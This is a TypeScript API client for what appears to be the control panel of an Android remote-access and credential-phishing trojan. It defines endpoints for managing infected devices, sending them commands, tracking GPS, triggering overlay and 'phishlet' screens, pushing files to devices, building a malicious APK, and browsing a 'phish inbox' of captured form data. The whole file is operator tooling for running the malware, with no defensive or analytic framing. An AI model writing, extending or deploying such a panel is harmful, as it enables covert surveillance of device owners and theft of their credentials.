import axios from 'axios';

const api = axios.create({
  baseURL: '/api',
  timeout: 30000,
  withCredentials: true,
  headers: { 'Content-Type': 'application/json' },
});

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('auth-token');
  if (token && !config.headers?.Authorization) {
    config.headers = config.headers || {};
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

const AUTH_WHITELIST = ['/auth/login', '/auth/logout', '/auth/me'];
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      const url = error.config?.url || '';
      const isAuthEndpoint = AUTH_WHITELIST.some(ep => url.includes(ep));
      if (!isAuthEndpoint) {
        localStorage.removeItem('auth-user');
        localStorage.removeItem('auth-token');
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
    }
    return Promise.reject(error);
  }
);

export default api;

export const authApi = {
  login: (username: string, password: string) => api.post('/auth/login', { username, password }),
  logout: () => api.post('/auth/logout'),
  me: () => api.get('/auth/me'),
  changePassword: (currentPassword: string, newPassword: string) => api.post('/auth/change-password', { currentPassword, newPassword }),
  updateProfile: (data: { username?: string; email?: string }) => api.post('/auth/update-profile', data),
  sessions: () => api.get('/auth/sessions'),
  revokeSession: (id: string) => api.delete(`/auth/sessions/${id}`),
};

export const dashboardApi = { getData: () => api.get('/dashboard') };

export const clientsApi = {
  getAll: () => api.get('/clients'),
  getOne: (id: string) => api.get(`/client/${id}`),
  getPage: (id: string, page: string, signal?: AbortSignal) => api.get(`/client/${id}/${page}`, { signal }),
  delete: (id: string) => api.delete(`/client/${id}`),
  sendCommand: (id: string, cmd: string, params?: Record<string, unknown>) => api.post(`/cmd/${id}/${cmd}`, params || {}),
  setGps: (id: string, interval: number) => api.post(`/gps/${id}/${interval}`),
  assign: (id: string, ownerId: string) => api.put(`/client/${id}/assign`, { ownerId }),
  unassign: (id: string) => api.put(`/client/${id}/unassign`),
  getOverlayConfig: (id: string) => api.get(`/client/${id}/overlay/config`),
  setOverlayConfig: (id: string, data: any) => api.post(`/client/${id}/overlay/config`, data),
  triggerOverlay: (id: string, data: any) => api.post(`/client/${id}/overlay/trigger`, data),
  hideOverlay: (id: string) => api.post(`/client/${id}/overlay/hide`, {}),
  getPhishletData: (id: string) => api.get(`/client/${id}/phishlet/data`),
  triggerPhishlet: (id: string, data: any) => api.post(`/client/${id}/phishlet/trigger`, data),
  hidePhishlet: (id: string) => api.post(`/client/${id}/phishlet/hide`, {}),
  clearPhishletData: (id: string) => api.delete(`/client/${id}/phishlet/data`),
  getPhishletTemplates: () => api.get('/phishlet/templates'),
  createPhishletTemplate: (data: any) => api.post('/phishlet/templates', data),
};

export const logsApi = {
  getLogs: (params?: { type?: string; category?: string; search?: string; limit?: number }, signal?: AbortSignal) => api.get('/logs', { params, signal }),
  getStats: () => api.get('/logs/stats'),
  clear: () => api.post('/logs/clear'),
};

export const builderApi = {
  getServerUrl: () => api.get('/builder/server-url'),
  build: (formData: FormData) => api.post('/builder/build', formData, { headers: { 'Content-Type': 'multipart/form-data' }, timeout: 600000 }),
  getStatus: () => api.get('/builder/status'),
  downloadApk: (onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => api.get('/builder/download', { responseType: 'blob', timeout: 300000, onDownloadProgress: onProgress }),
};

export const filesApi = {
  pushToDevice: (clientId: string, dstPath: string, file: File, onProgress?: (progressEvent: { loaded: number; total?: number }) => void) => {
    const formData = new FormData();
    formData.append('file', file);
    return api.post(`/files/push?clientId=${encodeURIComponent(clientId)}&dst=${encodeURIComponent(dstPath)}`, formData, {
      headers: { 'Content-Type': 'multipart/form-data' },
      timeout: 300000,
      onUploadProgress: onProgress,
    });
  },
};

export const usersApi = {
  getAll: () => api.get('/users'),
  create: (data: { username: string; email: string; password: string; role: string; permissions?: string[] }) => api.post('/users', data),
  update: (id: string, data: { username?: string; email?: string; role?: string; permissions?: string[] }) => api.put(`/users/${id}`, data),
  updatePermissions: (id: string, permissions: string[]) => api.put(`/users/${id}/permissions`, { permissions }),
  getPermissionsSchema: () => api.get('/users/permissions-schema'),
  resetPassword: (id: string, password: string) => api.put(`/users/${id}/password`, { password }),
  regenerateSecret: (id: string) => api.post(`/users/${id}/regenerate-secret`),
  getUserSecret: (id: string) => api.get(`/users/${id}/secret`),
  setUserSecret: (id: string, value: string) => api.post(`/users/${id}/secret`, { value }),
  delete: (id: string) => api.delete(`/users/${id}`),
};

export const configApi = {
  get: () => api.get('/config'),
  set: (key: string, value: string) => api.post('/config', { key, value }),
  getDeviceSecret: () => api.get('/config/device-secret'),
  setDeviceSecret: (value: string) => api.post('/config/device-secret', { value }),
  regenerateDeviceSecret: () => api.post('/config/device-secret/regenerate'),
};

export const setupApi = {
  getStatus: () => axios.get('/api/setup/status'),
  complete: (data: {
    admin: { username: string; email: string; password: string };
    deviceSecret?: string;
    generateDeviceSecret?: boolean;
  }) => axios.post('/api/setup/complete', data),
};

export const phishInboxApi = {
  list: (filters?: { unread?: boolean; category?: string; captureType?: string; clientId?: string; starred?: boolean; search?: string }) => {
    const params = new URLSearchParams();
    if (filters?.unread) params.set('unread', 'true');
    if (filters?.category) params.set('category', filters.category);
    if (filters?.captureType) params.set('captureType', filters.captureType);
    if (filters?.clientId) params.set('clientId', filters.clientId);
    if (filters?.starred) params.set('starred', 'true');
    if (filters?.search) params.set('search', filters.search);
    const qs = params.toString();
    return api.get(`/phish-inbox${qs ? '?' + qs : ''}`);
  },
  unreadCount: () => api.get('/phish-inbox/unread-count'),
  stats: () => api.get('/phish-inbox/stats'),
  markRead: (id: number) => api.post(`/phish-inbox/${id}/read`),
  markAllRead: () => api.post('/phish-inbox/read-all'),
  toggleStar: (id: number) => api.post(`/phish-inbox/${id}/star`),
  delete: (id: number) => api.delete(`/phish-inbox/${id}`),
  clearAll: () => api.delete('/phish-inbox'),
  classify: (data: { packageName: string; fieldName: string; fieldValue: string; formData?: string }) =>
    api.post('/phish-inbox/classify', data),
};

export async function fetchAuthBlob(url: string): Promise<Blob | null> {
  try {
    const token = localStorage.getItem('auth-token');
    const res = await fetch(url, {
      headers: token ? { Authorization: `Bearer ${token}` } : {},
    });
    if (res.status === 401) {

      const isAuthEndpoint = url.includes('/api/auth/') || url.includes('/api/setup/');
      if (!isAuthEndpoint) {
        localStorage.removeItem('auth-user');
        localStorage.removeItem('auth-token');
        window.dispatchEvent(new CustomEvent('auth:unauthorized'));
      }
      return null;
    }
    if (!res.ok) return null;
    return await res.blob();
  } catch {
    return null;
  }
}

export async function fetchAuthObjectURL(url: string): Promise<string | null> {
  const blob = await fetchAuthBlob(url);
  return blob ? URL.createObjectURL(blob) : null;
}
